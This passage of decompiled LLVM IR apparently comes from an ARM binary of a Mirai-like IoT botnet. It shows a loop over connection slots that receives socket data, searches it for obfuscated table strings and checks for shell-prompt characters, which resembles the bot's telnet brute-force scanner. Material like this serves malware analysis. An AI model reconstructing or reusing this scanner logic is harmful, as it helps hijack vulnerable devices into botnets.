  %v0_eb68 = load i32, i32* @r4, align 4
  store i32 %v0_eb68, i32* %stack_var_-52, align 4
  store i32 %v2_eb60, i32* @global_var_21728.133, align 4
  br label %dec_label_pc_eb70

dec_label_pc_eb70:                                ; preds = %dec_label_pc_ecd8, %dec_label_pc_eb18
  %v0_eb7c = phi i32 [ %v1_ecdc, %dec_label_pc_ecd8 ], [ %v0_eb68, %dec_label_pc_eb18 ]
  store i32 ptrtoint (i32* @global_var_2420c.145 to i32), i32* %r0.global-to-local, align 4
  %v3_eb74 = mul i32 %v0_eb7c, 256
  store i32 %v3_eb74, i32* %r3.global-to-local, align 4
  %v2_eb78 = load i32, i32* @global_var_2420c.145, align 4
  store i32 %v2_eb78, i32* %r1.global-to-local, align 4
  %v2_eb80 = mul i32 %v0_eb7c, 288
  store i32 %v2_eb80, i32* %r2.global-to-local, align 4
  %v2_eb84 = add i32 %v2_eb78, %v2_eb80
  store i32 %v2_eb84, i32* @r6, align 4
  %v1_eb88 = add i32 %v2_eb84, 4
  %v2_eb88 = inttoptr i32 %v1_eb88 to i32*
  %v3_eb88 = load i32, i32* %v2_eb88, align 4
  store i32 %v3_eb88, i32* %r0.global-to-local, align 4
  %v2_eb8c = icmp eq i32 %v3_eb88, -1
  store i1 %v2_eb8c, i1* %cpsr_c.global-to-local, align 1
  %v7_eb8c = icmp eq i32 %v3_eb88, -1
  store i1 %v7_eb8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb8c, label %dec_label_pc_ecd8, label %dec_label_pc_eb94

dec_label_pc_eb94:                                ; preds = %dec_label_pc_eb70
  %v3_eb94 = udiv i32 %v3_eb88, 32
  store i32 %v2_eaf4, i32* %r1.global-to-local, align 4
  %v3_eb9c = mul nuw nsw i32 %v3_eb94, 4
  store i32 %v3_eb9c, i32* @ip, align 4
  %v2_eba0 = add i32 %v3_eb9c, %v2_eaf4
  store i32 %v2_eba0, i32* %r2.global-to-local, align 4
  %v1_eba4 = add i32 %v2_eba0, -312
  %v2_eba4 = inttoptr i32 %v1_eba4 to i32*
  %v3_eba4 = load i32, i32* %v2_eba4, align 4
  %v1_eba8 = urem i32 %v3_eb88, 32
  store i32 %v1_eba8, i32* %r1.global-to-local, align 4
  %v2_ebac = add nsw i32 %v1_eba8, -1
  %v3_ebac = shl i32 1, %v2_ebac
  %v4_ebac = and i32 %v3_eba4, %v3_ebac
  %v5_ebac = icmp ne i32 %v4_ebac, 0
  store i1 %v5_ebac, i1* %cpsr_c.global-to-local, align 1
  %v6_ebac = ashr i32 %v3_eba4, %v1_eba8
  store i32 %v6_ebac, i32* %r3.global-to-local, align 4
  %v1_ebb0 = urem i32 %v6_ebac, 2
  %v2_ebb0 = icmp eq i32 %v1_ebb0, 0
  store i1 %v2_ebb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebb0, label %dec_label_pc_ebb8, label %dec_label_pc_f6e0

dec_label_pc_ebb8:                                ; preds = %dec_label_pc_eb94, %dec_label_pc_f78c
  %v1_ebc4 = phi i32 [ %v1_eba8, %dec_label_pc_eb94 ], [ %v1_ebc4.pre, %dec_label_pc_f78c ]
  %v0_ebbc = phi i32 [ %v3_eb9c, %dec_label_pc_eb94 ], [ %v0_ebbc.pre, %dec_label_pc_f78c ]
  store i32 %v2_eaf4, i32* @lr, align 4
  %v2_ebbc = add i32 %v0_ebbc, %v2_eaf4
  store i32 %v2_ebbc, i32* %r2.global-to-local, align 4
  %v1_ebc0 = add i32 %v2_ebbc, -184
  %v2_ebc0 = inttoptr i32 %v1_ebc0 to i32*
  %v3_ebc0 = load i32, i32* %v2_ebc0, align 4
  %v2_ebc4 = add i32 %v1_ebc4, -1
  %v3_ebc4 = shl i32 1, %v2_ebc4
  %v4_ebc4 = and i32 %v3_ebc0, %v3_ebc4
  %v5_ebc4 = icmp ne i32 %v4_ebc4, 0
  store i1 %v5_ebc4, i1* %cpsr_c.global-to-local, align 1
  %v6_ebc4 = ashr i32 %v3_ebc0, %v1_ebc4
  store i32 %v6_ebc4, i32* %r3.global-to-local, align 4
  %v1_ebc8 = urem i32 %v6_ebc4, 2
  %v2_ebc8 = icmp eq i32 %v1_ebc8, 0
  store i1 %v2_ebc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebc8, label %dec_label_pc_ecd8, label %dec_label_pc_ebd0.preheader

dec_label_pc_ebd0.preheader:                      ; preds = %dec_label_pc_ebb8
  %v0_ebd0176 = load i32, i32* @r6, align 4
  %v1_ebd0177 = add i32 %v0_ebd0176, 12
  %v2_ebd0178 = inttoptr i32 %v1_ebd0177 to i32*
  %v3_ebd0179 = load i32, i32* %v2_ebd0178, align 4
  store i32 %v3_ebd0179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebd4175181 = icmp eq i32 %v3_ebd0179, 0
  store i1 %v2_ebd4175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebd4175181, label %dec_label_pc_ecd8, label %dec_label_pc_ebdc.lr.ph

dec_label_pc_ebd0.loopexit:                       ; preds = %dec_label_pc_f5e4, %dec_label_pc_f3e8
  %v0_ebd0 = load i32, i32* @r6, align 4
  %v1_ebd0 = add i32 %v0_ebd0, 12
  %v2_ebd0 = inttoptr i32 %v1_ebd0 to i32*
  %v3_ebd0 = load i32, i32* %v2_ebd0, align 4
  store i32 %v3_ebd0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebd4175 = icmp eq i32 %v3_ebd0, 0
  store i1 %v2_ebd4175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebd4175, label %dec_label_pc_ecd8, label %dec_label_pc_ebdc.lr.ph

dec_label_pc_ebdc.lr.ph:                          ; preds = %dec_label_pc_ebd0.preheader, %dec_label_pc_ebd0.loopexit
  %v0_ebdc231 = phi i32 [ %v0_ebd0, %dec_label_pc_ebd0.loopexit ], [ %v0_ebd0176, %dec_label_pc_ebd0.preheader ]
  br label %dec_label_pc_ebdc

dec_label_pc_ebdc:                                ; preds = %dec_label_pc_ebd4.backedge.thread, %dec_label_pc_ebd4.backedge, %dec_label_pc_ebd4.backedge.thread559, %dec_label_pc_ebdc.lr.ph
  %v0_f6b0 = phi i32 [ %v0_ebdc231, %dec_label_pc_ebdc.lr.ph ], [ %v0_ebdc228, %dec_label_pc_ebd4.backedge ], [ %v0_ec50, %dec_label_pc_ebd4.backedge.thread ], [ %v0_ec50, %dec_label_pc_ebd4.backedge.thread559 ]
  %v1_ebdc = add i32 %v0_f6b0, 24
  %v2_ebdc = inttoptr i32 %v1_ebdc to i32*
  %v3_ebdc = load i32, i32* %v2_ebdc, align 4
  store i32 %v3_ebdc, i32* @r3, align 4
  %v2_ebe0 = icmp ugt i32 %v3_ebdc, 255
  store i1 %v2_ebe0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebe0 = icmp eq i32 %v3_ebdc, 256
  store i1 %v7_ebe0, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_f6b0, 28
  store i32 %.pre282, i32* @sb, align 4
  br i1 %v7_ebe0, label %dec_label_pc_f6b0, label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebdc, %dec_label_pc_f6b0
  store i32 0, i32* @r5, align 4
  %v1_ebf0 = load i32, i32* @fp, align 4
  %v2_ebf0 = inttoptr i32 %v1_ebf0 to i32*
  store i32 0, i32* %v2_ebf0, align 4
  %v0_ebf4 = load i32, i32* @r6, align 4
  %v1_ebf4 = add i32 %v0_ebf4, 24
  %v2_ebf4 = inttoptr i32 %v1_ebf4 to i32*
  %v3_ebf4 = load i32, i32* %v2_ebf4, align 4
  store i32 %v3_ebf4, i32* %r2.global-to-local, align 4
  %v0_ebf8 = load i32, i32* @sb, align 4
  %v2_ebf8 = add i32 %v0_ebf8, %v3_ebf4
  store i32 %v2_ebf8, i32* @r4, align 4
  %v1_ebfc = add i32 %v0_ebf4, 4
  %v2_ebfc = inttoptr i32 %v1_ebfc to i32*
  %v3_ebfc = load i32, i32* %v2_ebfc, align 4
  store i32 %v3_ebfc, i32* %r0.global-to-local, align 4
  %v1_ec00 = sub i32 256, %v3_ebf4
  store i32 %v1_ec00, i32* %r2.global-to-local, align 4
  store i32 %v2_ebf8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ec0c = call i32 @__libc_recv(i32 %v3_ebfc, i32 %v2_ebf8, i32 %v1_ec00, i32 16384)
  store i32 %v4_ec0c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec10 = icmp eq i32 %v4_ec0c, 0
  store i1 %v2_ec10, i1* %cpsr_z.global-to-local, align 1
  %tmp417 = icmp slt i32 %v4_ec0c, 1
  br i1 %tmp417, label %dec_label_pc_ec88, label %dec_label_pc_ec18

dec_label_pc_ec18:                                ; preds = %dec_label_pc_ebec
  %v0_ec18 = load i32, i32* @r5, align 4
  store i32 %v0_ec18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec1c

dec_label_pc_ec1c:                                ; preds = %.thread82, %dec_label_pc_ec18
  %v3_ec28 = phi i32 [ %v1_ec2c, %.thread82 ], [ %v0_ec18, %dec_label_pc_ec18 ]
  %v1_ec1c = load i32, i32* @r4, align 4
  %v2_ec1c = add i32 %v1_ec1c, %v3_ec28
  %v3_ec1c = inttoptr i32 %v2_ec1c to i8*
  %v4_ec1c = load i8, i8* %v3_ec1c, align 1
  %v6_ec1c = zext i8 %v4_ec1c to i32
  store i32 %v6_ec1c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec20 = icmp eq i8 %v4_ec1c, 0
  store i1 %v2_ec20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec20, label %bb418, label %.thread82

bb418:                                            ; preds = %dec_label_pc_ec1c
  %v2_ec24 = add nuw nsw i32 %v6_ec1c, 65
  store i32 %v2_ec24, i32* %r3.global-to-local, align 4
  %v2_ec28 = trunc i32 %v2_ec24 to i8
  store i8 %v2_ec28, i8* %v3_ec1c, align 1
  %v0_ec2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_ec1c, %bb418
  %v0_ec2c = phi i32 [ %v3_ec28, %dec_label_pc_ec1c ], [ %v0_ec2c.pre, %bb418 ]
  %v1_ec2c = add i32 %v0_ec2c, 1
  store i32 %v1_ec2c, i32* %r2.global-to-local, align 4
  %v3_ec30 = icmp uge i32 %v1_ec2c, %v4_ec0c
  store i1 %v3_ec30, i1* %cpsr_c.global-to-local, align 1
  %v9_ec30 = icmp eq i32 %v1_ec2c, %v4_ec0c
  store i1 %v9_ec30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec30, label %dec_label_pc_ec38, label %dec_label_pc_ec1c

dec_label_pc_ec38:                                ; preds = %.thread82, %dec_label_pc_ec8c
  store i32 ptrtoint (i32* @global_var_21728.133 to i32), i32* %r1.global-to-local, align 4
  %v0_ec3c = load i32, i32* @r6, align 4
  %v1_ec3c = add i32 %v0_ec3c, 24
  %v2_ec3c = inttoptr i32 %v1_ec3c to i32*
  %v3_ec3c = load i32, i32* %v2_ec3c, align 4
  %v2_ec40 = load i32, i32* @global_var_21728.133, align 4
  store i32 %v2_ec40, i32* %r2.global-to-local, align 4
  %v2_ec44 = add i32 %v3_ec3c, %v4_ec0c
  store i32 %v2_ec44, i32* %r3.global-to-local, align 4
  store i32 %v2_ec44, i32* %v2_ec3c, align 4
  %v0_ec4c = load i32, i32* %r2.global-to-local, align 4
  %v1_ec4c = load i32, i32* @r6, align 4
  %v2_ec4c = add i32 %v1_ec4c, 8
  %v3_ec4c = inttoptr i32 %v2_ec4c to i32*
  store i32 %v0_ec4c, i32* %v3_ec4c, align 4
  br label %dec_label_pc_ec50

dec_label_pc_ec50:                                ; preds = %dec_label_pc_ed6c, %dec_label_pc_ec38
  %v0_ec50 = load i32, i32* @r6, align 4
  %v1_ec50 = add i32 %v0_ec50, 12
  %v2_ec50 = inttoptr i32 %v1_ec50 to i32*
  %v3_ec50 = load i32, i32* %v2_ec50, align 4
  store i32 %v3_ec50, i32* %r0.global-to-local, align 4
  %v1_ec54 = add i32 %v3_ec50, -2
  store i32 %v1_ec54, i32* @r3, align 4
  %v7_ec58 = icmp eq i32 %v1_ec54, 8
  store i1 %v7_ec58, i1* %cpsr_z.global-to-local, align 1
  %v5_ec5c = and i32 %v1_ec54, 1073741824
  %v6_ec5c = icmp ne i32 %v5_ec5c, 0
  store i1 %v6_ec5c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_ec50, label %dec_label_pc_ebd4.backedge [
    i32 2, label %dec_label_pc_ef3c
    i32 3, label %dec_label_pc_f3f4
    i32 4, label %dec_label_pc_f300
    i32 5, label %dec_label_pc_f0e0
    i32 6, label %dec_label_pc_f00c
    i32 7, label %dec_label_pc_f22c
    i32 8, label %dec_label_pc_ee68
    i32 9, label %dec_label_pc_ed94
    i32 10, label %dec_label_pc_ecf0
  ]

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ebec
  br i1 %v2_ec10, label %dec_label_pc_f7e0, label %dec_label_pc_ec8c

dec_label_pc_ec8c:                                ; preds = %dec_label_pc_ec88
  %v3_ec8c = icmp eq i32 %v4_ec0c, -1
  store i1 %v3_ec8c, i1* %cpsr_c.global-to-local, align 1
  %v8_ec8c = icmp eq i32 %v4_ec0c, -1
  store i1 %v8_ec8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ec8c, label %dec_label_pc_ec94, label %dec_label_pc_ec38

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec8c
  %v0_ec94 = load i32, i32* @fp, align 4
  %v1_ec94 = inttoptr i32 %v0_ec94 to i32*
  %v2_ec94 = load i32, i32* %v1_ec94, align 4
  store i32 %v2_ec94, i32* %r3.global-to-local, align 4
  %v2_ec98 = icmp ugt i32 %v2_ec94, 10
  store i1 %v2_ec98, i1* %cpsr_c.global-to-local, align 1
  %v7_ec98 = icmp eq i32 %v2_ec94, 11
  store i1 %v7_ec98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec98, label %dec_label_pc_ecd8, label %dec_label_pc_eca0

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec94, %dec_label_pc_f7e0
  %v0_eca0 = load i32, i32* @r6, align 4
  %v1_eca0 = add i32 %v0_eca0, 4
  %v2_eca0 = inttoptr i32 %v1_eca0 to i32*
  %v3_eca0 = load i32, i32* %v2_eca0, align 4
  store i32 %v3_eca0, i32* %r0.global-to-local, align 4
  %v1_eca4 = call i32 @__GI___libc_close(i32 %v3_eca0)
  store i32 %v1_eca4, i32* %r0.global-to-local, align 4
  %v0_eca8 = load i32, i32* @r6, align 4
  %v1_eca8 = add i32 %v0_eca8, 284
  %v2_eca8 = inttoptr i32 %v1_eca8 to i8*
  %v3_eca8 = load i8, i8* %v2_eca8, align 1
  %v4_eca8 = zext i8 %v3_eca8 to i32
  %v1_ecac = add nuw nsw i32 %v4_eca8, 1
  %v1_ecb0 = urem i32 %v1_ecac, 256
  store i32 %v1_ecb0, i32* %r3.global-to-local, align 4
  %v2_ecb4 = icmp ugt i32 %v1_ecb0, 8
  store i1 %v2_ecb4, i1* %cpsr_c.global-to-local, align 1
  %v7_ecb4 = icmp eq i32 %v1_ecb0, 9
  store i1 %v7_ecb4, i1* %cpsr_z.global-to-local, align 1
  %v1_ecb8 = trunc i32 %v1_ecac to i8
  store i8 %v1_ecb8, i8* %v2_eca8, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_ecc0 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_ecc0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_ecc0 = xor i1 %v1_ecc0, true
  %v3_ecc0 = and i1 %v0_ecc0, %v2_ecc0
  br i1 %v3_ecc0, label %bb419, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_eca0
  %v1_ecc4309314 = load i32, i32* @r6, align 4
  %v2_ecc4310315 = add i32 %v1_ecc4309314, 4
  %v3_ecc4311316 = inttoptr i32 %v2_ecc4310315 to i32*
  store i32 -1, i32* %v3_ecc4311316, align 4
  br label %bb420

bb419:                                            ; preds = %dec_label_pc_eca0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ecc4305 = load i32, i32* @r6, align 4
  %v2_ecc4306 = add i32 %v1_ecc4305, 4
  %v3_ecc4307 = inttoptr i32 %v2_ecc4306 to i32*
  store i32 -1, i32* %v3_ecc4307, align 4
  %v4_ecc8 = load i32, i32* %r3.global-to-local, align 4
  %v5_ecc8 = load i32, i32* @r6, align 4
  %v6_ecc8 = add i32 %v5_ecc8, 12
  %v7_ecc8 = inttoptr i32 %v6_ecc8 to i32*
  store i32 %v4_ecc8, i32* %v7_ecc8, align 4
  %v4_eccc = load i32, i32* %r3.global-to-local, align 4
  %v5_eccc = trunc i32 %v4_eccc to i8
  %v6_eccc = load i32, i32* @r6, align 4
  %v7_eccc = add i32 %v6_eccc, 284
  %v8_eccc = inttoptr i32 %v7_eccc to i8*
  store i8 %v5_eccc, i8* %v8_eccc, align 1
  %v0_ecd0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ecd0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb420

bb420:                                            ; preds = %.thread313, %bb419
  %v1_ecd4 = phi i1 [ %v1_ecd0.pre, %bb419 ], [ %v0_ecc0, %.thread313 ]
  %v0_ecd4 = phi i1 [ %v0_ecd0.pre, %bb419 ], [ %v1_ecc0, %.thread313 ]
  %v2_ecd0 = xor i1 %v1_ecd4, true
  %v3_ecd0 = or i1 %v0_ecd4, %v2_ecd0
  br i1 %v3_ecd0, label %bb421, label %bb422

bb421:                                            ; preds = %bb420
  %v4_ecd0 = load i32, i32* @r6, align 4
  store i32 %v4_ecd0, i32* %r0.global-to-local, align 4
  br label %bb422

bb422:                                            ; preds = %bb420, %bb421
  store i32 60632, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_ecd0, i32 ptrtoint (i32* @global_var_dfc4.197 to i32))
  br label %dec_label_pc_ecd8

dec_label_pc_ecd8:                                ; preds = %dec_label_pc_ebd0.loopexit, %dec_label_pc_ebd4.backedge, %dec_label_pc_ebd0.preheader, %dec_label_pc_ec94, %dec_label_pc_ebb8, %dec_label_pc_eb70, %dec_label_pc_f7c4, %bb422
  %v3_ecd8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ecd8, i32* %r3.global-to-local, align 4
  %v1_ecdc = add i32 %v3_ecd8, 1
  store i32 %v1_ecdc, i32* @r4, align 4
  %v2_ece0 = icmp ugt i32 %v1_ecdc, 254
  store i1 %v2_ece0, i1* %cpsr_c.global-to-local, align 1
  %v7_ece0 = icmp eq i32 %v1_ecdc, 255
  store i1 %v7_ece0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ecdc, i32* %stack_var_-52, align 4
  %v7_ece8 = icmp slt i32 %v1_ecdc, 256
  br i1 %v7_ece8, label %dec_label_pc_eb70, label %dec_label_pc_e4f0

dec_label_pc_ecf0:                                ; preds = %dec_label_pc_ec50
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_ecf4 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_ed04 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_ed08 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ed04, i32* %r2.global-to-local, align 4
  %v1_ed10 = add i32 %v3_ed08, -1
  store i32 %v1_ed10, i32* %r3.global-to-local, align 4
  %v0_ed14 = load i32, i32* @sb, align 4
  store i32 %v0_ed14, i32* %r0.global-to-local, align 4
  %v0_ed18 = load i32, i32* @r6, align 4
  %v1_ed18 = add i32 %v0_ed18, 24
  %v2_ed18 = inttoptr i32 %v1_ed18 to i32*
  %v3_ed18 = load i32, i32* %v2_ed18, align 4
  store i32 %v3_ed18, i32* %r1.global-to-local, align 4
  %v4_ed1c = call i32 @util_memsearch(i32 %v0_ed14, i32 %v3_ed18, i32 %v3_ed04, i32 %v1_ed10)
  %v2_ed20 = icmp eq i32 %v4_ed1c, -1
  store i1 %v2_ed20, i1* %cpsr_c.global-to-local, align 1
  %v7_ed20 = icmp eq i32 %v4_ed1c, -1
  store i1 %v7_ed20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_ed1c, i32* @r4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f5e8 = call i32 @table_lock_val(i32 10)
  br i1 %v7_ed20, label %dec_label_pc_f5e4, label %dec_label_pc_ed2c

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ecf0
  store i32 %v1_f5e8, i32* %r0.global-to-local, align 4
  %v0_ed34 = load i32, i32* @r6, align 4
  %v1_ed34 = add i32 %v0_ed34, 4
  %v2_ed34 = inttoptr i32 %v1_ed34 to i32*
  %v3_ed34 = load i32, i32* %v2_ed34, align 4
  store i32 %v3_ed34, i32* %r0.global-to-local, align 4
  %v1_ed38 = call i32 @__GI___libc_close(i32 %v3_ed34)
  store i32 %v1_ed38, i32* %r0.global-to-local, align 4
  %v0_ed3c = load i32, i32* @r6, align 4
  %v1_ed3c = add i32 %v0_ed3c, 284
  %v2_ed3c = inttoptr i32 %v1_ed3c to i8*
  %v3_ed3c = load i8, i8* %v2_ed3c, align 1
  %v4_ed3c = zext i8 %v3_ed3c to i32
  %v1_ed40 = add nuw nsw i32 %v4_ed3c, 1
  %v1_ed44 = urem i32 %v1_ed40, 256
  store i32 %v1_ed44, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ed4c = icmp ugt i32 %v1_ed44, 9
  store i1 %v2_ed4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed4c = icmp eq i32 %v1_ed44, 10
  store i1 %v7_ed4c, i1* %cpsr_z.global-to-local, align 1
  %v2_ed50 = add i32 %v0_ed3c, 4
  %v3_ed50 = inttoptr i32 %v2_ed50 to i32*
  store i32 -1, i32* %v3_ed50, align 4
  %v0_ed54 = load i32, i32* @r3, align 4
  %v1_ed54 = trunc i32 %v0_ed54 to i8
  %v2_ed54 = load i32, i32* @r6, align 4
  %v3_ed54 = add i32 %v2_ed54, 284
  %v4_ed54 = inttoptr i32 %v3_ed54 to i8*
  store i8 %v1_ed54, i8* %v4_ed54, align 1
  %v0_ed58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ed58, label %dec_label_pc_ed5c, label %dec_label_pc_f6d4

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed2c
  store i32 0, i32* @r3, align 4
  %v1_ed60 = load i32, i32* @r6, align 4
  %v2_ed60 = add i32 %v1_ed60, 12
  %v3_ed60 = inttoptr i32 %v2_ed60 to i32*
  store i32 0, i32* %v3_ed60, align 4
  %v0_ed64 = load i32, i32* @r3, align 4
  %v1_ed64 = trunc i32 %v0_ed64 to i8
  %v2_ed64 = load i32, i32* @r6, align 4
  %v3_ed64 = add i32 %v2_ed64, 284
  %v4_ed64 = inttoptr i32 %v3_ed64 to i8*
  store i8 %v1_ed64, i8* %v4_ed64, align 1
  br label %dec_label_pc_ed68

dec_label_pc_ed68:                                ; preds = %dec_label_pc_f6d4, %dec_label_pc_ed5c
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_f3e8, %dec_label_pc_f2a8, %dec_label_pc_f15c, %dec_label_pc_f088, %dec_label_pc_eee4, %dec_label_pc_ee10, %dec_label_pc_ed68
  %v0_ed6c = load i32, i32* @r6, align 4
  %v1_ed6c = add i32 %v0_ed6c, 24
  %v2_ed6c = inttoptr i32 %v1_ed6c to i32*
  %v3_ed6c = load i32, i32* %v2_ed6c, align 4
  %v0_ed70 = load i32, i32* @r7, align 4
  %v2_ed70 = sub i32 %v0_ed70, %v3_ed6c
  %v3_ed70 = icmp uge i32 %v0_ed70, %v3_ed6c
  store i1 %v3_ed70, i1* %cpsr_c.global-to-local, align 1
  %v4_ed70 = xor i32 %v0_ed70, %v3_ed6c
  %v5_ed70 = xor i32 %v2_ed70, %v0_ed70
  %v6_ed70 = and i32 %v5_ed70, %v4_ed70
  %v7_ed70 = icmp slt i32 %v6_ed70, 0
  %v8_ed70 = icmp slt i32 %v2_ed70, 0
  %v9_ed70 = icmp eq i32 %v0_ed70, %v3_ed6c
  store i1 %v9_ed70, i1* %cpsr_z.global-to-local, align 1
  %v2_ed74 = xor i1 %v8_ed70, %v7_ed70
  %v0_ed70.v3_ed6c = select i1 %v2_ed74, i32 %v0_ed70, i32 %v3_ed6c
  store i32 %v0_ed70.v3_ed6c, i32* %r1.global-to-local, align 4
  %v2_ed7c = sub i32 %v3_ed6c, %v0_ed70.v3_ed6c
  store i32 %v2_ed7c, i32* @r2, align 4
  store i32 %v2_ed7c, i32* %v2_ed6c, align 4
  %v0_ed84 = load i32, i32* @sb, align 4
  %v1_ed84 = load i32, i32* %r1.global-to-local, align 4
  %v2_ed84 = add i32 %v1_ed84, %v0_ed84
  store i32 %v2_ed84, i32* @r1, align 4
  store i32 %v0_ed84, i32* @r0, align 4
  %v3_ed8c = call i32 @memmove(i32 %v0_ed84, i32 %v2_ed84, i32 %v2_ed7c)
  store i32 %v3_ed8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ec50

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ec50
  %v1_ed94 = add i32 %v0_ec50, 24
  %v2_ed94 = inttoptr i32 %v1_ed94 to i32*
  %v3_ed94 = load i32, i32* %v2_ed94, align 4
  store i32 %v3_ed94, i32* %r2.global-to-local, align 4
  %v1_ed98 = add i32 %v3_ed94, -1
  store i32 %v1_ed98, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed9c = icmp eq i32 %v1_ed98, 0
  store i1 %v2_ed9c, i1* %cpsr_z.global-to-local, align 1
  %tmp425 = icmp slt i32 %v1_ed98, 1
  br i1 %tmp425, label %dec_label_pc_ebd4.backedge.thread, label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ed94
  %v2_eda4 = add i32 %v1_ed98, %v0_ec50
  store i32 %v2_eda4, i32* %r3.global-to-local, align 4
  %v1_eda8 = add i32 %v2_eda4, 28
  %v2_eda8 = inttoptr i32 %v1_eda8 to i8*
  %v3_eda8 = load i8, i8* %v2_eda8, align 1
  %v4_eda8 = zext i8 %v3_eda8 to i32
  store i32 %v4_eda8, i32* %r3.global-to-local, align 4
  %v2_edac = icmp ugt i8 %v3_eda8, 61
  store i1 %v2_edac, i1* %cpsr_c.global-to-local, align 1
  %v7_edac = icmp eq i8 %v3_eda8, 62
  store i1 %v7_edac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edac, label %dec_label_pc_ee10, label %bb426

bb426:                                            ; preds = %dec_label_pc_eda4
  %v3_edb0 = icmp ugt i8 %v3_eda8, 57
  store i1 %v3_edb0, i1* %cpsr_c.global-to-local, align 1
  %v8_edb0 = icmp eq i8 %v3_eda8, 58
  store i1 %v8_edb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_edb0, label %dec_label_pc_ee10, label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %bb426
  %v2_edb8 = icmp ugt i8 %v3_eda8, 35
  store i1 %v2_edb8, i1* %cpsr_c.global-to-local, align 1
  %v7_edb8 = icmp eq i8 %v3_eda8, 36
  store i1 %v7_edb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edb8, label %dec_label_pc_ee10, label %dec_label_pc_edc0

dec_label_pc_edc0:                                ; preds = %dec_label_pc_edb8
  %v2_edc0 = icmp ugt i8 %v3_eda8, 34
  store i1 %v2_edc0, i1* %cpsr_c.global-to-local, align 1
  %v7_edc0 = icmp eq i8 %v3_eda8, 35
  store i1 %v7_edc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edc0, label %dec_label_pc_ee10, label %dec_label_pc_edc8

dec_label_pc_edc8:                                ; preds = %dec_label_pc_edc0
  %v2_edc8 = icmp ugt i8 %v3_eda8, 36
  store i1 %v2_edc8, i1* %cpsr_c.global-to-local, align 1
  %v7_edc8 = icmp eq i8 %v3_eda8, 37
  store i1 %v7_edc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edc8, label %dec_label_pc_ee10, label %dec_label_pc_edf8.preheader

dec_label_pc_edf8.preheader:                      ; preds = %dec_label_pc_edc8
  %v3_edcc = add i32 %v0_ec50, 28
  %v2_edd0 = add i32 %v3_edcc, %v3_ed94
  store i32 %v2_edd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_edf8

dec_label_pc_eddc:                                ; preds = %bb427
  %v2_eddc = icmp ugt i8 %v3_ee00, 35
  store i1 %v2_eddc, i1* %cpsr_c.global-to-local, align 1
  %v7_eddc = icmp eq i8 %v3_ee00, 36
  store i1 %v7_eddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eddc, label %dec_label_pc_ee10, label %dec_label_pc_ede4

dec_label_pc_ede4:                                ; preds = %dec_label_pc_eddc
  %v2_ede4 = icmp ugt i8 %v3_ee00, 34
  store i1 %v2_ede4, i1* %cpsr_c.global-to-local, align 1
  %v7_ede4 = icmp eq i8 %v3_ee00, 35
  store i1 %v7_ede4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ede4, label %dec_label_pc_ee10, label %dec_label_pc_edec

